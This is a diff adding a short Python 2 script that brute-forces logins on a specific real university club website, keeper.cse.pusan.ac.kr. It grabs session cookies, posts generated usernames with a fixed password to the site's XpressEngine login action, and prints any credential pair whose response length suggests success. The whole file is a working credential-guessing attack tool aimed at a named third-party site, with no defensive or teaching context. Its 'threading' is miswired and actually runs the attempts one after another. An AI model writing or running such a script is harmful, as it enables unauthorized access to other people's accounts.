@@ -1,0 +1,75 @@
+#-*- coding: utf-8 -*-
+
+import requests
+import threading
+
+url = "http://keeper.cse.pusan.ac.kr"
+
+class BruteThread(threading.Thread):
+    def run(self, id, pw):
+        downloadFile(id, pw)
+
+def downloadFile(id, password):
+
+    headers = {
+        "Host":"keeper.cse.pusan.ac.kr",
+        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8",
+        "Accept-Language":"ko-kr",
+        "Connection":"close"
+
+    }
+    ### 1
+    request = requests
+    homeRequest = requests.get(url, headers=headers)
+    cookieValue = homeRequest.cookies
+    cookieValue.set("PHPSESSID", homeRequest.cookies["PHPSESSID"], domain="keeper.cse.pusan.ac.kr", path='/')
+    cookieValue.set("xe_shield", homeRequest.cookies["xe_shield"], domain="keeper.cse.pusan.ac.kr", path='/')
+    cookieValue.set("mobile", homeRequest.cookies["mobile"], domain="keeper.cse.pusan.ac.kr", path='/')
+    cookieValue.set("user-agent", homeRequest.cookies["user-agent"], domain="keeper.cse.pusan.ac.kr", path='/')
+
+    #print "Send Session ID"
+    #printCookieValue(homeRequest.cookies)
+
+
+    #print homeRequest.text
+
+    headers["Host"] = "keeper.cse.pusan.ac.kr"
+    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+    headers["Accept-Language"] = "ko-kr"
+    headers["Content-Type"] = "application/x-www-form-urlencoded"
+    headers["Origin"] = "http://keeper.cse.pusan.ac.kr"
+    headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8"
+    headers["Connection"] = "close"
+    headers["Upgrade-Insecure-Requests"] = "1"
+    headers["Referer"] = "http://keeper.cse.pusan.ac.kr/"
+
+    ##print "###################################################################"
+
+    postValue = {
+        "user_id":id,
+        "password":password,
+        "error_return_url":"keeper_home",
+        "mid":"keeper_home",
+        "vid":"",
+        "ruleset":"@login",
+        "act":"procMemberLogin",
+        "success_return_url":"keeper_home",
+    }
+    ### 2
+    loginRequest = request.post(url=url, headers=headers, data=postValue)
+    print loginRequest.text
+
+    if len(loginRequest.text) > 47000:
+        print len(loginRequest.text)
+        print "ID:" + postValue["user_id"] + "Pw:" + postValue["password"]
+    else:
+        print len(loginRequest.text)
+
+
+if __name__ == "__main__":
+
+    for i in range(0, 10):
+        t = BruteThread();
+        t.run("wlsqudgk12" + str(i), "asdf")
